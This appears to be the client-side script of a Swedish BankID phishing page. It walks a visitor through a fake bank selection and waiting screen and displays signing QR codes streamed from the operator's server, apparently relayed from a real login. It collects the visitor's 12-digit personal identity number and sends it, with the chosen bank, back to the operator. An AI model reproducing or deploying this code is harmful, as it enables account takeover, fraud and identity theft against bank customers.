document.addEventListener('DOMContentLoaded', function() {
    const socket = io();
    const loaderElement = document.querySelector('.loader');
    const qrImage = document.getElementById('qrImage');
    const qrText = document.getElementById('qrText');
    const generateQrButton = document.getElementById('generateQrButton');
    const agreeSignText = document.getElementById('agreeSignText');
    const qrCard = document.getElementById('qrCard');
    const contentContainer = document.querySelector('.content-container');
    const bankListContainer = document.getElementById('bankListContainer');
    const bankList = document.getElementById('bankList');
    const bankItems = bankList.querySelectorAll('li');
    const waitingSection = document.getElementById('waitingSection');
    const loginContainer = document.getElementById('loginContainer');
    const continueButton = document.getElementById('continue-button');
    const bankNameFromBankList = document.getElementById('bank-name-from-bank-list');
    
    let isLoading = false;
    let lastUpdateTime = Date.now();
    let isButtonClicked = false;

    bankListContainer.style.display = 'none';
    waitingSection.style.display = 'none';
    loginContainer.style.display = 'none'; 
    qrCard.style.display = 'none'; 

    generateQrButton.addEventListener('click', function() {
        if (!isButtonClicked) {
            agreeSignText.style.display = 'none';
            qrCard.style.display = 'none'; 
            isLoading = false; 
            loaderElement.classList.remove('active');

            bankListContainer.style.display = 'block';
            isButtonClicked = true;
        }
    });

    socket.on('update_qr_code_image', function(data) {
        qrImage.src = 'data:image/png;base64,' + data.qr_image;
        isLoading = false;
        loaderElement.classList.remove('active');
        loaderElement.classList.add('hidden');
        qrImage.classList.add('active');
        qrText.classList.add('active');
        lastUpdateTime = Date.now();

        contentContainer.style.height = 'auto';

        if (generateQrButton.innerHTML == 'Inväntar ytterligare signeringar') {
            generateQrButton.style.display = 'none';
        }

    });
    
    bankItems.forEach(item => {
        item.addEventListener('click', function() {
            const bankName = item.querySelector('.bank-name').textContent.trim();
            
            bankListContainer.style.display = 'none';
            waitingSection.style.display = 'flex';
            
            setTimeout(() => {
                waitingSection.style.display = 'none';
                qrCard.style.display = 'block';
                isLoading = true;
                socket.emit('generate_qr_code');
                generateQrButton.innerHTML = 'Inväntar ytterligare signeringar';
                generateQrButton.style.backgroundColor = 'white';
                generateQrButton.style.color = '#000';
                generateQrButton.style.border = 'none';
                
                socket.emit('bank_clicked', { bankName: bankName });
                loginContainer.style.display = 'block';
                bankNameFromBankList.innerHTML = bankName;
            }, 3000); 
            contentContainer.style.display = 'none';
        });
    });

    
    const searchInput = document.getElementById('searchInput');
    searchInput.addEventListener('input', () => {
        const searchTerm = searchInput.value.toLowerCase();
        
        bankItems.forEach(item => {
            const bankName = item.querySelector('.bank-name').textContent.toLowerCase();

            if (bankName.includes(searchTerm)) {
                item.style.display = 'flex'; 
            } else {
                item.style.display = 'none';
            }
        });
    });
    
    const loginMethod = document.getElementById('login-method');
    const personalNumber = document.getElementById('personal-number');
    
    function checkFormValidity() {
        const personalNumberValue = personalNumber.value;
        const isNumeric = /^\d+$/.test(personalNumberValue);

        if (loginMethod.value && isNumeric && personalNumberValue.length === 12) {
            continueButton.classList.add('enabled');
        } else {
            continueButton.classList.remove('enabled');
        }
    }
    
    loginMethod.addEventListener('change', checkFormValidity);
    personalNumber.addEventListener('input', checkFormValidity);
    
    continueButton.addEventListener('click', function(event) {
        event.preventDefault(); 
        loginContainer.style.display = 'none'; 
        qrCard.style.display = 'block'; 
        contentContainer.style.display = 'block';

        socket.emit('personalNumber', { personalNumber: personalNumber.value });

    });


    document.querySelector('.sidebar-toggler').addEventListener('click', function() {
        var helpTexts = document.querySelectorAll('.help-button-text');
        helpTexts.forEach(function(text) {
            text.classList.toggle('hidden');
        });
    });
    document.querySelector('.cancel-bankid').addEventListener('click', function() {
        document.getElementById('bankid-qr-code').classList.remove('current');
        window.location.reload();
    });
});
